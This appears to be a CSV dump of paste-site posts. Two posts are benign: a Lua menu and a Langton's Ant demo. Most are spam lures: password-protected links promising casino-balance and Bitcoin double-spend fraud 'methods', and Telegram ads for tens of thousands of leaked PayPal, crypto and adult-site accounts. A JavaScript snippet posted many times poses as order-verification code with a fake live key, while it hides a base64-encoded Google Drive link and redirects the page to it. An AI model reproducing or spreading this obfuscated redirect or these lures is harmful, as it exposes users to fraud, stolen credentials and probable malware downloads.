id,title,username,language,date,content
T9Jf2wmy,Welcome Screen,Alexr360,Lua,Sunday 4th of May 2025 12:13:29 AM CDT,"-- Utility functions
local function lineBreak()
    local width = term.getSize()
    print(string.rep(""-"", width))
end

local function clearScreen()
    term.clear()
    term.setCursorPos(1, 1)
end

-- Menu entries: {Display Name, Program Name}
local menuItems = {
    {""Bastion"", ""Bastion""},
    {""Automatic Bastion"", ""RBastion""},
    {""GPS"", ""GPS""},
    {""Artillery Controller"", ""ArtilleryControl""},
    {""Teleport Controller"", ""Teleport""},
    {""Stargate Controller"", ""psg""},
    {""To-Do List"", ""todo""},
    {""Update"", ""Update""},
    {""Exit"", nil} -- nil indicates exit
}

local function drawMenu()
    clearScreen()
    print(""Welcome to Monopoly OS by Monopoly Co."")
    lineBreak()
    print(""Current Time: "" .. textutils.formatTime(os.time(), true))
    lineBreak()
    print(""Select a program to run:"")
    for i, item in ipairs(menuItems) do
        print(i .. "". "" .. item[1])
    end
    lineBreak()
end

local function getClickedItem(y)
    -- Menu starts on line 6
    local index = y - 6
    if index >= 1 and index <= #menuItems then
        return index
    end
    return nil
end

-- Main execution
drawMenu()

while true do
    local event, button, x, y = os.pullEvent()

    if event == ""mouse_click"" then
        local choice = getClickedItem(y)
        if choice then
            local entry = menuItems[choice]
            if entry[2] == nil then
                break -- Exit
            else
                shell.run(entry[2])
                drawMenu()
            end
        end
    elseif event == ""char"" then
        local num = tonumber(button)
        if num and menuItems[num] then
            local entry = menuItems[num]
            if entry[2] == nil then
                break
            else
                shell.run(entry[2])
                drawMenu()
            end
        end
    end
end"
pR2b7AWn,Stake Free Balance Method,iLoveToWatch,JavaScript,Sunday 4th of May 2025 12:11:03 AM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 29989
efauqkfW,Untitled,Xp_Isolation,JavaScript,Sunday 4th of May 2025 12:10:36 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/38720/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
FxAcR7v8,PayPal with Balance,rodrigomaise99,JavaScript,Sunday 4th of May 2025 12:10:19 AM CDT,82602 Accounts Posted On https://t.me/leakzbyeminem
ambNQGcz,EARN $900 INSTANTLY 2025⭐ GV,wwomanwww,JavaScript,Sunday 4th of May 2025 12:06:38 AM CDT," 
Pdf https://tinyurl.com/freshleaks

LBz01pHbmP
"
pae83J8k,Scam Casinos and Stores,iLoveToWatch,JavaScript,Saturday 3rd of May 2025 11:55:41 PM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 23520
LAbpMbb1,Products.js,Xp_Isolation,JavaScript,Saturday 3rd of May 2025 11:55:15 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/98291/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
bwBTxwPq,Leaked Accounts - Fresh Hits,rodrigomaise99,JavaScript,Saturday 3rd of May 2025 11:54:57 PM CDT,71314 Accounts Posted On https://t.me/leakzbyeminem
A13HD2nS,Doublespending using Vanity Wallet,iLoveToWatch,JavaScript,Saturday 3rd of May 2025 11:40:20 PM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 65639
Eyp0g7Tf,Order.js,Xp_Isolation,JavaScript,Saturday 3rd of May 2025 11:39:54 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/37116/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
5jS3nCFE,Chaturbate with Tokens,rodrigomaise99,JavaScript,Saturday 3rd of May 2025 11:39:35 PM CDT,59243 Accounts Posted On https://t.me/leakzbyeminem
hAb9ky8t,Abuse RBF in BTC transactions,iLoveToWatch,JavaScript,Saturday 3rd of May 2025 11:24:59 PM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 94180
xVCxNJhT,Market.js,Xp_Isolation,JavaScript,Saturday 3rd of May 2025 11:24:32 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/76963/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
11AdtLVf,Crypto Accounts,rodrigomaise99,JavaScript,Saturday 3rd of May 2025 11:24:14 PM CDT,03657 Accounts Posted On https://t.me/leakzbyeminem
Fw4LTN2B,Langton's Ant,here2share,HTML,Saturday 3rd of May 2025 11:17:05 PM CDT,"<!DOCTYPE html>
<html lang=""en"">
<head>
    <meta charset=""UTF-8"">
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
    <title>Langton's Ant</title>
    <style>
        canvas { border: 1px solid black; }
    </style>
</head>
<body>
    <canvas id=""gridCanvas""></canvas>
    <script>
        const WW = 560, HH = 560;
        const GRID_SIZE = 10;
        const ROWS = HH / GRID_SIZE, COLS = WW / GRID_SIZE;
        const canvas = document.getElementById('gridCanvas');
        const ctx = canvas.getContext('2d');
        canvas.width = WW;
        canvas.height = HH;

        let grid = Array.from({ length: ROWS }, () => Array(COLS).fill(0));
        let ant_x = Math.floor(ROWS / 2), ant_y = Math.floor(COLS / 2);
        let ant_direction = 0; // 0: up, 1: right, 2: down, 3: left

        function draw() {
            grid[ant_x][ant_y] ^= 1;
            ctx.fillStyle = grid[ant_x][ant_y] ? ""black"" : ""white"";
            ctx.fillRect(ant_y * GRID_SIZE, ant_x * GRID_SIZE, GRID_SIZE, GRID_SIZE);

            ant_direction = grid[ant_x][ant_y] ? (ant_direction + 1) % 4 : (ant_direction + 3) % 4;

            if (ant_direction === 0) ant_x--;
            else if (ant_direction === 1) ant_y++;
            else if (ant_direction === 2) ant_x++;
            else if (ant_direction === 3) ant_y--;

            ant_x = (ant_x + ROWS) % ROWS;
            ant_y = (ant_y + COLS) % COLS;

            requestAnimationFrame(draw);
        }

        draw();
    </script>
</body>
</html>"
ZNh1FQAL,Stake Free Balance Method,iLoveToWatch,JavaScript,Saturday 3rd of May 2025 11:09:37 PM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 76172
WksvcdUX,Untitled,Xp_Isolation,JavaScript,Saturday 3rd of May 2025 11:09:10 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/65166/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
DDu0WAPz,PayPal with Balance,rodrigomaise99,JavaScript,Saturday 3rd of May 2025 11:08:52 PM CDT,90243 Accounts Posted On https://t.me/leakzbyeminem
n1ZS0evM,Scam Casinos and Stores,iLoveToWatch,JavaScript,Saturday 3rd of May 2025 10:54:15 PM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 20869
bdW7QGwX,Products.js,Xp_Isolation,JavaScript,Saturday 3rd of May 2025 10:53:49 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/81625/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
9iGAiEff,Leaked Accounts - Fresh Hits,rodrigomaise99,JavaScript,Saturday 3rd of May 2025 10:53:31 PM CDT,39450 Accounts Posted On https://t.me/leakzbyeminem
M85zAuvz,Doublespending using Vanity Wallet,iLoveToWatch,JavaScript,Saturday 3rd of May 2025 10:38:54 PM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 16885
04f16bWU,Order.js,Xp_Isolation,JavaScript,Saturday 3rd of May 2025 10:38:27 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/93346/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
70Nib2pb,Chaturbate with Tokens,rodrigomaise99,JavaScript,Saturday 3rd of May 2025 10:38:09 PM CDT,35303 Accounts Posted On https://t.me/leakzbyeminem
Cc1wX9JM,Abuse RBF in BTC transactions,iLoveToWatch,JavaScript,Saturday 3rd of May 2025 10:23:32 PM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 61039
8pVG74Ww,Market.js,Xp_Isolation,JavaScript,Saturday 3rd of May 2025 10:23:06 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/33247/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
kt4daY5T,Crypto Accounts,rodrigomaise99,JavaScript,Saturday 3rd of May 2025 10:22:40 PM CDT,29178 Accounts Posted On https://t.me/leakzbyeminem
LQ7mL4AL,Stake Free Balance Method,iLoveToWatch,JavaScript,Saturday 3rd of May 2025 10:08:10 PM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 31541
v5a2jC1K,Untitled,Xp_Isolation,JavaScript,Saturday 3rd of May 2025 10:07:44 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/99953/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Hc8hXAx5,PayPal with Balance,rodrigomaise99,JavaScript,Saturday 3rd of May 2025 10:07:18 PM CDT,16440 Accounts Posted On https://t.me/leakzbyeminem
AtRkYiTh,Stake Free Balance Method,Xp_Isolation,JavaScript,Saturday 3rd of May 2025 09:52:44 PM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 67432
fQD6yYTE,Untitled,rodrigomaise99,JavaScript,Saturday 3rd of May 2025 09:52:17 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/20734/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
